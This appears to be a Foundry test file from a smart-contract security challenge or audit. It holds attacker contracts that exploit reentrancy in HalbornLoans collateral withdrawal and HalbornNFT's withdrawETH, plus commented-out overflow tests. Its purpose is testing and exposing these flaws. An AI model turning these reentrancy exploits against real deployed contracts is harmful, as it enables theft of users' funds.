// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {Merkle} from "./murky/Merkle.sol";

import {HalbornNFT} from "../src/HalbornNFT.sol";
import {HalbornToken} from "../src/HalbornToken.sol";
import {HalbornLoans} from "../src/HalbornLoans.sol";

import {IERC721ReceiverUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/token/ERC721/IERC721ReceiverUpgradeable.sol";

abstract contract Attacker is IERC721ReceiverUpgradeable {

    HalbornLoans public halbornLoans;
    HalbornNFT public halbornNFT;
    bool public enter = false;
    uint256 nftId = 1;
    uint256 count = 1;

    constructor(address _halbornLoansAddress, address _halbornNFTAddress) {
        halbornLoans = HalbornLoans(_halbornLoansAddress);
        halbornNFT = HalbornNFT(_halbornNFTAddress);
    }

    function attack() external payable {
        enter = true;
        halbornLoans.depositNFTCollateral(nftId);
        console.log(halbornNFT.ownerOf(nftId));
        halbornLoans.withdrawCollateral(nftId);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {

        console.log("Entering onERC721Received function in Attack contract");
        if (enter && count < 5){
            count++;
            halbornLoans.depositNFTCollateral(nftId);
            halbornLoans.withdrawCollateral(nftId);
        } 
        if (count == 5){
            count++;
            halbornLoans.getLoan(9 ether);
            console.log(halbornNFT.ownerOf(nftId));
        }

        // Log the receipt of the ERC721 token
        emit ERC721Received(operator, from, tokenId, data);

        // Return the ERC721_RECEIVED selector as per ERC721 standard
        return IERC721ReceiverUpgradeable.onERC721Received.selector;
    }
    
    // Event to log the receipt of the ERC721 token
    event ERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes data
    );
}

contract Attacker2 is IERC721ReceiverUpgradeable {

    bool public enter = true;

    constructor() {
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {

        console.log("Entering onERC721Received function in Attack2 contract");
        if (enter) {
            enter = false;
            tokenId = type(uint256).max;
        }

        // Log the receipt of the ERC721 token
        emit ERC721Received(operator, from, tokenId, data);

        // Return the ERC721_RECEIVED selector as per ERC721 standard
        return IERC721ReceiverUpgradeable.onERC721Received.selector;
    }
    
    // Event to log the receipt of the ERC721 token
    event ERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes data
    );
}

contract Attacker3 is IERC721ReceiverUpgradeable,Test {

    bool public enter = true;

    // Declaring 2 addresses to test
    address public immutable ALICE = makeAddr("ALICE");
    address public immutable BOB = makeAddr("BOB");

    // Declaring byte arrays to save the Alice Proof and Bob proof
    bytes32[] public ALICE_PROOF_1;
    bytes32[] public ALICE_PROOF_2;
    bytes32[] public BOB_PROOF_1;
    bytes32[] public BOB_PROOF_2;
    bytes32[] public EXAMPLE;

    // Declaring nft, token and loans contracts
    HalbornNFT public nft2;

    constructor() {
        // Initialize
        Merkle m = new Merkle();
        // Test Data
        bytes32[] memory data = new bytes32[](4);
        data[0] = keccak256(abi.encodePacked(ALICE, uint256(15)));
        data[1] = keccak256(abi.encodePacked(ALICE, uint256(19)));
        data[2] = keccak256(abi.encodePacked(BOB, uint256(21)));
        data[3] = keccak256(abi.encodePacked(BOB, uint256(24)));

        // Get Merkle Root
        bytes32 root = m.getRoot(data);

        // Get Proofs
        ALICE_PROOF_1 = m.getProof(data, 0);
        ALICE_PROOF_2 = m.getProof(data, 1);
        BOB_PROOF_1 = m.getProof(data, 2);
        BOB_PROOF_2 = m.getProof(data, 3);
        nft2 = new HalbornNFT();
        nft2.initialize(root, 1 ether);
    }

    receive() payable external {
        console.log("Entering receive() function");
        // Call the withdrawETH function of the vulnerable HalbornNFT contract
        //vm.pauseGasMetering();
        if (address(nft2).balance >= 1 ether) {
            nft2.withdrawETH(1 ether);
        }
    }

    function attack() public {
        //nft2.mintBuyWithETH{value: 1 ether}();
        //vm.pauseGasMetering();
        nft2.withdrawETH(1 ether);
        console.log(nft2.ownerOf(1));
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {

        console.log("Entering onERC721Received function in Attack3 contract");

        // Log the receipt of the ERC721 token
        emit ERC721Received(operator, from, tokenId, data);

        // Return the ERC721_RECEIVED selector as per ERC721 standard
        return IERC721ReceiverUpgradeable.onERC721Received.selector;
    }
    
    // Event to log the receipt of the ERC721 token
    event ERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes data
    );
}

contract HalbornTest is Test {
    // Declaring 2 addresses to test
    address public immutable ALICE = makeAddr("ALICE");
    address public immutable BOB = makeAddr("BOB");

    // Declaring byte arrays to save the Alice Proof and Bob proof
    bytes32[] public ALICE_PROOF_1;
    bytes32[] public ALICE_PROOF_2;
    bytes32[] public BOB_PROOF_1;
    bytes32[] public BOB_PROOF_2;
    bytes32[] public EXAMPLE;

    // Declaring nft, token and loans contracts
    HalbornNFT public nft;
    HalbornNFT public nft2;
    HalbornToken public token;
    HalbornLoans public loans;

    function setUp() public {
        // Initialize
        Merkle m = new Merkle();
        // Test Data
        bytes32[] memory data = new bytes32[](4);
        data[0] = keccak256(abi.encodePacked(ALICE, uint256(15)));
        data[1] = keccak256(abi.encodePacked(ALICE, uint256(19)));
        data[2] = keccak256(abi.encodePacked(BOB, uint256(21)));
        data[3] = keccak256(abi.encodePacked(BOB, uint256(24)));

        // Get Merkle Root
        bytes32 root = m.getRoot(data);

        // Get Proofs
        ALICE_PROOF_1 = m.getProof(data, 0);
        ALICE_PROOF_2 = m.getProof(data, 1);
        BOB_PROOF_1 = m.getProof(data, 2);
        BOB_PROOF_2 = m.getProof(data, 3);

        assertTrue(m.verifyProof(root, ALICE_PROOF_1, data[0]));
        assertTrue(m.verifyProof(root, ALICE_PROOF_2, data[1]));
        assertTrue(m.verifyProof(root, BOB_PROOF_1, data[2]));
        assertTrue(m.verifyProof(root, BOB_PROOF_2, data[3]));

        nft = new HalbornNFT();
        nft.initialize(root, 1 ether);

        token = new HalbornToken();
        token.initialize();

        loans = new HalbornLoans(2 ether);
        loans.initialize(address(token), address(nft));

        token.setLoans(address(loans));

    }


    function testwithdrawETH() public {
        Attacker3 attacker3 = new Attacker3();
        vm.startPrank(BOB);
        vm.deal(BOB, 5 ether);
        for (uint256 i=0; i < 5; i++) {
            attacker3.nft2().mintBuyWithETH{value: 1 ether}();
        }
        vm.stopPrank();
        vm.startPrank(address(attacker3));
        attacker3.attack();
        vm.stopPrank();
        console.log("Ending test function");
    }

    /*function testmintBuyWithETHOverflow() public {
        Attacker2 attacker2 = new Attacker2();
        vm.startPrank(address(attacker2));
        vm.deal(address(attacker2), 2 ether);
        nft.mintBuyWithETH{value: 1 ether}();
        nft.mintBuyWithETH{value: 1 ether}();
        vm.stopPrank();
    }*/

    /*function testnftMintAirdrops() public {
        vm.startPrank(BOB);
        vm.deal(BOB, 2 ether);
        nft.mintBuyWithETH{value: 1 ether}();
        nft.mintAirdrops(1, BOB_PROOF_1);
        nft.mintAirdrops(2, BOB_PROOF_2);
        vm.stopPrank();
    }*/

    /*function testReentrancyCollateral() public {

        Attacker attacker = new Attacker(address(loans), address(nft));
        vm.startPrank(address(attacker));
        vm.deal(address(attacker), 50 ether);
        nft.setApprovalForAll(address(loans), true);
        
        attacker.attack();
        console.log(nft.ownerOf(1));
        vm.stopPrank();
    
    }*/

    /*function testdepositNFTCollateral() public {

        vm.startPrank(ALICE);
        vm.deal(ALICE, 20 ether);
        nft.mintAirdrops(15, ALICE_PROOF_1);
        nft.mintAirdrops(19, ALICE_PROOF_2);
        vm.stopPrank();

        vm.startPrank(BOB);
        vm.deal(BOB, 2 ether);
        nft.mintAirdrops(21, BOB_PROOF_1);
        nft.mintAirdrops(24, BOB_PROOF_2);
        vm.stopPrank();
        
        vm.startPrank(ALICE);
        nft.setApprovalForAll(address(loans), true);
        nft.safeTransferFrom(ALICE, BOB, 15);
        assertEq(nft.ownerOf(15), BOB);
        vm.stopPrank();

        vm.startPrank(BOB);
        nft.setApprovalForAll(address(loans), true);
        loans.depositNFTCollateral(21);
        loans.withdrawCollateral(21);
        vm.stopPrank();
    
    }*/

    // Test getLoan Integer Overflow Vulnerability
    /*function testGetLoanIntegerOverflow() public {
        vm.startPrank(ALICE);
        loans.getLoan(2 ether);
        vm.stopPrank();
    }*/

    /*function testGetLoanIntegerOverflow2() public {
        vm.startPrank(ALICE);
        vm.deal(ALICE, 2 ether);
        nft.setApprovalForAll(address(loans), true);
        nft.mintAirdrops(15, ALICE_PROOF_1);
        loans.depositNFTCollateral(15);
        //vm.expectRevert();
        loans.getLoan(5 ether);
        vm.stopPrank();
    }*/

    // Test returnLoan Vulnerability
    /*function testReturnLoanIntegerOverflow() public {
        vm.startPrank(BOB);
        vm.deal(BOB, 2 ether);
        nft.setApprovalForAll(address(loans), true);
        nft.mintAirdrops(21, BOB_PROOF_1);
        loans.depositNFTCollateral(21);
        loans.getLoan(2 ether);
        loans.returnLoan(2 ether);
        vm.expectRevert();
        loans.getLoan(2 ether);
        vm.stopPrank();
    }*/

    
}
